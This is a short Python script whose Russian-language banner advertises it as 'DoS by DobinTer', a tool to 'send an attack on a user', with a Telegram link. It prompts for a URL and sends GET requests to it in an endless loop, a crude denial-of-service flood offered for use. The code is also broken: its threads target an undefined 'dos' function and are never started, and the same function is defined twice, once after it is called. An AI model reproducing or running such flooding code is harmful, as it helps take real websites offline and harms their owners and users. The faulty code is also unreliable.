import requests
import threading


def input_link():
    # Голубой цвет
    print("\033[34mВведите ссылку:\033[0m")
    link = input()
    while True:
    	requests.get(link)
    	threading.Thread(target = dos, args=(link))
banner = '''
█▀▄ █▀█ █▀
█▄▀ █▄█ ▄█
Добро пожаловать в DoS by DobinTer
Здесь вы можете отправить аттаку на пользователя
https://t.me/doo_ter
____________________

'''
print(banner)
input_link()

def input_link():
    # Голубой цвет
    print("\033[34mВведите ссылку:\033[0m")
    link = input()
    while True:
    	requests.get(link)
    	threading.Thread(target = dos, args=(link))